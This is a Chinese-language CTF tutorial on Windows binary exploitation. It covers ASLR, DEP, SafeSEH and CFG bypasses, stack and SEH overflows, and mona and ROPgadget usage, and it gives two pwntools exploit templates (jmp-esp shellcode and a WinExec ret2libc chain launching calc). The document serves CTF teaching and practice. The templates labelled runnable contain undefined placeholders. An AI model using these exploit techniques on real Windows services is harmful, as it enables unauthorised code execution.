---
title: Windows pwn 入门 —— ASLR/DEP/CFG 保护、栈溢出与 SEH 利用
category: pwn
tags: [Windows, SEH, DEP, ASLR, CFG, ret2dll]
signals: [附件是 exe 或 dll 而不是 elf, 题目要求 nc 到一个 windows 服务端口, 程序使用 recv 或 fgets 读入并 strcpy 到栈缓冲区, 崩溃时异常处理器地址被覆盖, 需要 mona 或 Immunity 调试, 题目给了 kernel32 dll 而没有 libc]
difficulty: medium
source: "CTF-Wiki Windows 平台 Pwn / Microsoft CFG 与 DEP 文档 / Corelan SEH 教程"
tools: [x64dbg, Immunity Debugger, mona.py, checksec(pwn), ROPgadget, pwntools]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 附件是 `.exe` / `.dll`，或者题目直接给 `nc HOST PORT`（远程跑 Wine / Windows Server）。
- 反汇编里出现 `recv`、`fgets`、`strcpy`、`lstrcpyA`，之后直接把数据塞进栈缓冲区。
- 程序崩溃时 `EIP` 被覆盖成 `0x41414141`，栈上出现你输入的 pattern。
- 32 位 PE，`DllCharacteristics` 为 0（无 ASLR / DEP）。
- 题目附件带 `kernel32.dll`、`msvcrt.dll`（而不是 `libc.so.6`）。
- 有些题会给一个 `x64` 的 `.exe` 并提示「ASLR 已开，需要信息泄漏」。

## 二、原理

### 1. Windows 的四道保护

| 保护 | 机制 | 绕过方式 |
| --- | --- | --- |
| **ASLR** | PE 头 `DllCharacteristics` 的 `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE`，模块随机基址 | 泄漏一个模块地址；或利用**未开启 ASLR 的 DLL**（如某些系统 dll） |
| **DEP / NX** | `IMAGE_DLLCHARACTERISTICS_NX_COMPAT`，栈不可执行 | ROP（`VirtualProtect`）或 `ret2libc`（`WinExec`、`system`） |
| **SafeSEH** | 编译器 `-SAFESEH`，异常处理链校验 `SEH` 指针在模块的合法范围内 | 用「未开启 SafeSEH 的模块」的 pop-pop-ret gadget |
| **CFG** | 编译器 `/guard:cf`，间接调用前校验目标是否为函数入口 | CFG 不覆盖**结构性利用**（`ret` 指令），也不覆盖 `RtlCaptureContext` 那样的合法函数；常用「跳到合法函数入口 + 参数控制」 |

### 2. 栈溢出布局（32 位）

```
[ esp ]            ← 局部变量
[buffer           ]  ← 溢出源
[ saved ebp      ]  ← +0x?? 
[ 返回地址 EIP   ]
[ 参数 ...       ]
```

偏移用 `msf-pattern_create -l 3000` / `mona pattern_create` 生成，崩溃后 `msf-pattern_offset -q 0x41414141`。

### 3. SEH 利用（栈溢出恰好落在异常链上时）

32 位下每个线程的 `FS:[0]` 指向 `_EXCEPTION_REGISTRATION_RECORD` 链：

```c
struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;  // 0x00
    EXCEPTION_DISPOSITION (*Handler)(...);        // 0x04
};
```

溢出覆盖 `Next` 与 `Handler`，第二个异常发生时 `call Handler`。为绕过 SafeSEH：

- `pop pop ret` 必须位于**未开 SafeSEH 的模块**（`mona.py seh -m unsafe`）。
- 若开了 `SEHOP`，还得让异常链结构合法（`Next` 指向 `ntdll!FinalExceptionHandler`）。

### 4. CFG 的现实

CFG 只校验**间接调用**的目标（`call [eax]`、`call [vtable]`），**`ret` 不在检查范围**。
所以栈溢出 + ROP 对 CFG 基本免疫，只有「函数指针劫持」类漏洞才需要绕过 CFG（跳到任何函数入口 -> 用参数控制行为）。

## 三、解题步骤

1. **检查保护**
   ```bash
   pwn checksec --file=./pwn.exe
   python -c "import pefile;pefile.PE('./pwn.exe').OPTIONAL_HEADER.DllCharacteristics"
   # 0x4000 = DYNAMIC_BASE(ASLR)；0x40 = NX_COMPAT(DEP)；0x100 = GUARD_CF(CFG)
   ```
2. **找偏移**：`msf-pattern_create -l 2000` 发送，崩溃后 `msf-pattern_offset -q 0x41326241`。
3. **找模块基址**：`gdb` 不行，用 `x64dbg` / `Immunity` 的 `mona.py`。
4. **确认是否有 ASLR**：`mona modules` 看 Rebase 列；找 `False` 的模块。
5. **找 gadget**：
   ```bash
   ROPgadget --binary kernel32.dll --only "pop|ret"
   mona.py -i --pattern "pop eax; ret" -m module
   ```
6. **构造**：`[padding][pop eax; ret][args][jmp eax]` 或 `[padding][虚拟地址][shellcode]`（DEP 关时）。
7. **远程**：`io = remote(HOST, PORT)`，Windows 下 `recv` 与 `send` 字节数与 Linux 无差异。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# 32 位 PE 栈溢出 · 无 ASLR / 无 DEP：跳栈执行 shellcode
from pwn import *

context.log_level = 'info'
context.arch = 'i386'
context.os = 'windows'

HOST, PORT = 'TARGET', 1337
OFFSET_TO_EIP = 0x104              # 用 msf-pattern_offset 量出的偏移
JMP_ESP = 0x7c87658f              # 某个无 ASLR 模块里的 "jmp esp"，mona 给出
# 或者流行做法：直接返回 ret2libc 的 WinExec("cmd", SW_HIDE)

def start():
    return remote(HOST, PORT) if args.REMOTE else process('./pwn.exe')

io = start()

# ---------- 1. 纯 shellcode（DEP 关闭时） ----------
SC  = asm(shellcraft.windows_x86.exec_cmd("calc.exe"))
SC += b'\x90' * ((-len(SC)) % 4)

payload = flat({
    0x00: b'A' * OFFSET_TO_EIP,
    0x00 + OFFSET_TO_EIP: p32(JMP_ESP),
}, filler=b'B')

# ---------- 2. 发送 ----------
io.recvuntil(b'Input: ')
io.send(payload + SC)
io.interactive()
```

### 改用 `ret2libc`（DEP 开启时）

```python
from pwn import *

io = remote('TARGET', 1337)
# 需要先泄漏一个模块基址；下面假设已算出
kernel32_base = KBASE
WinExec       = kernel32_base + 0x5B3A0        # WinExec 的 RVA，按 dll 版本查
# 栈布局：WinExec("cmd.exe /c calc", SW_SHOW)
cmd     = 0x41414141 + 0x100                   # 指向 .data 上预置的字符串
payload = flat({
    0x00: b'A' * OFFSET,
    OFFSET + 0x00: p32(WinExec),
    OFFSET + 0x04: p32(0xdeadbeef),            # 返回地址（随便）
    OFFSET + 0x08: p32(cmd),                   # lpCmdLine
    OFFSET + 0x0c: p32(1),                     # uCmdShow
}, filler=b'B')
io.send(payload)
io.interactive()
```

### `mona.py` 常用命令（在 Immunity / x64dbg 中）

```text
!mona pattern_create 3000
!mona pattern_offset 41326241
!mona modules
!mona seh -m <module> -c
!mona jmp -r esp -m kernel32.dll
```

## 五、常见坑 / 变体

1. **`DllCharacteristics` 如何解读**：`0x4000 = DYNAMIC_BASE`(ASLR)、`0x40 = NX_COMPAT`(DEP)、
   `0x100 = GUARD_CF`(CFG)，三者互相独立，缺哪个就利用哪个。
2. **`jmp esp` 需落在可执行且未开 ASLR 的模块**：`kernel32.dll` 在大版本间偏移会变，别硬编码。
3. **换行截断**：`strcpy` 遇到 `\x00` 就停；shellcode 里避免 `00`，或用 `send` 精确控制。
4. **SafeSEH + SEHOP**：现代 Windows 上 SEH 利用窗口很小，优先找栈溢出到 `EIP`。
5. **CFG 不等于「不能 ROP」**：CFG 只保护间接调用，`ret` 不受限。
6. **x64 的栈**：参数前 4 个走 `rcx, rdx, r8, r9`，第 5 个起才上栈；shadow space 32 字节不能省。
7. **网络字节序**：Windows 的 `recv` 与 Linux 无差异；但 `send` 大量数据时注意 TCP 分段。
8. **`Wine` 调试**：CTF 常年在 Linux 上跑 Wine，`mona` 不可用时要靠 `gdb-wine` 或 `x64dbg` + `xinetd`。
9. **变体：DLL 劫持类**（`ret2dll`）—— 覆盖返回地址跳到 `LoadLibrary` + `GetProcAddress` 组合。

## 六、参考来源

- [CTF-Wiki：Windows 平台 Pwn 概述](https://ctf-wiki.org/pwn/windows/readme/)
- [CTF-Wiki：Windows 栈溢出原理](https://ctf-wiki.org/pwn/windows/user-mode/stackoverflow/stackoverflow-basic/)
- [CTF-Wiki：Windows ret2dll](https://ctf-wiki.org/pwn/windows/user-mode/stackoverflow/ret2dll/)
- [Microsoft：Control Flow Guard（CFG）机制](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
- [Microsoft：Data Execution Prevention（DEP）](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
- [Microsoft：/SAFESEH（安全异常处理）](https://learn.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers)
- [Corelan：SEH Overflow 教程](https://coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-2-seh-overflows)
- [mona.py（模块 / gadget / SEH 分析）](https://github.com/corelan/mona)
